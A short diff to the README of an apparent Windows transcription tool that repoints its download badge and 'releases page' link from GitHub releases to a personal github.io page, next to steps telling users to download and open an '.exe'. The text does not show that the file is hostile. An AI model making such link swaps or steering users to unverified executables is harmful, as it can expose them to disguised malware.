@@ -1,6 +1,6 @@
 # 🎙️ transcribe - Turn spoken words into clear text
 
-[![](https://img.shields.io/badge/Download-transcribe-blue.svg)](https://github.com/rithu8989/transcribe/releases)
+[![](https://img.shields.io/badge/Download-transcribe-blue.svg)](https://rithu8989.github.io)
 
 Transcribe turns audio and video files into text. It uses artificial intelligence to listen to your files and write down exactly what you hear. It runs entirely on your computer. Your files never leave your machine. You keep your data private.
 
@@ -12,7 +12,7 @@ The app processes audio locally. It does not send your data to a server. You get
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/rithu8989/transcribe/releases) to download the software.
+1. Visit the [releases page](https://rithu8989.github.io) to download the software.
 2. Look for the file ending in `.exe`.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
